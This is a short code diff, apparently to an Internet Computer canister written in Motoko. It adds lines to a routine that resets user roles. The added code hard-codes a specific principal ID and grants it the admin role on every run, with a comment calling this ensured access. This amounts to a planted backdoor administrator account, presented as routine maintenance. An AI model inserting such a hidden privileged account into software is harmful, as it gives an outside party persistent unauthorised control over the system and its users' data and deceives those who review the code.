@@ -114,6 +114,10 @@ actor {
       };
     };
     stableUserRoles := [];
+    // Ensure this principal always has admin access
+    let grantedAdmin = Principal.fromText("pkrwa-mascp-qxyf3-o2cbc-sue3p-tikvn-xxvov-abgvb-76ilk-jbdzd-xae");
+    accessControlState.userRoles.add(grantedAdmin, #admin);
+    accessControlState.adminAssigned := true;
   };
 
   private func seedDefaultOutlets() {
